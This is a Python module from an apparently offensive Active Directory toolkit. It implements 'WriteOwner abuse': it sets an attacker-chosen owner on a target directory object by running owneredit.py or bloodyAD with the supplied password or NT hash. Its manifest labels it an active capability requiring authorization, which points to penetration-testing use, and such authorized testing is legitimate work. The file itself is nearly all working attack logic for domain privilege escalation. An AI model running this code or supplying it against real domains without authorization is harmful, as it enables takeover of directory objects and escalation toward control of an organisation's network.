"""WriteOwner abuse — take ownership of AD object then grant rights."""
from __future__ import annotations
import subprocess, sys, shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.acl.writeowner_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "owner_change"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1222.001"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target_dn = getattr(args, "target_dn", None)
    new_owner = getattr(args, "new_owner", cred.username)
    dc_ip = getattr(args, "dc_ip", args.target)

    if not target_dn:
        print("[!] --target-dn required", file=sys.stderr)
        return 1

    print("[*] WriteOwner abuse: set owner of {} to {}".format(target_dn, new_owner))

    if shutil.which("owneredit.py"):
        cmd = [
            "owneredit.py",
            "-action", "write",
            "-new-owner", new_owner,
            "-target-dn", target_dn,
            "-dc-ip", dc_ip,
            "{}\\{}".format(args.domain, cred.username),
        ]
        if cred.has_hash:
            cmd.extend(["-hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])

        print("[*] {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        return result.returncode

    if shutil.which("bloodyAD"):
        cmd = [
            "bloodyAD", "--host", dc_ip,
            "-d", args.domain, "-u", cred.username,
        ]
        if cred.password:
            cmd.extend(["-p", cred.password])
        cmd.extend(["set", "owner", target_dn, new_owner])

        print("[*] {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print(result.stdout)
        return result.returncode

    print("[!] owneredit.py or bloodyAD not found", file=sys.stderr)
    return 1
